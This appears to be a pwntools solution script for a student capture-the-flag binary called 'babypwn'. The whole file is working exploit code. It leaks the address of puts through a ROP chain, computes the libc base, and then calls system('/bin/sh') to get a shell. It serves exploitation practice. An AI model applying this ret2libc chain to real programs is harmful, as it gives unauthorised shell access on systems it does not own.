from pwn import *

elf = ELF('./babypwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = elf.process()

p.recvuntil('Welcome student! Can you run /bin/sh')

popRdi = 0x0000000000401203
system = 0x7ffff7e3ce10
sh = 0x7ffff7f7c69b
main = 0x0000000000401169

puts_plt = 0x401030
puts_got = 0x0000000000403fc8

offset = 136
payload = ''
payload += '\x90'*offset
payload += p64(popRdi) + p64(puts_got) + p64(puts_plt) + p64(main)
# payload += p64(popRdi) + p64(sh) + p64(system)
p.sendline(payload)
p.recvline('Welcome student! Can you run /bin/sh')

data = p.recv(6)
data += "\x00" *(8 - len(data))
leak = u64(data)
print(leak)

libcBase = leak - libc.symbols['puts']
log.info("[+] libc.address : " + hex(libcBase))

system = libcBase + libc.symbols['system']
sh = libcBase + next(libc.search('/bin/sh'))

payload = ''
payload += '\x90'*offset
payload += p64(popRdi) + p64(sh) + p64(system)

p.sendline(payload)
p.interactive()
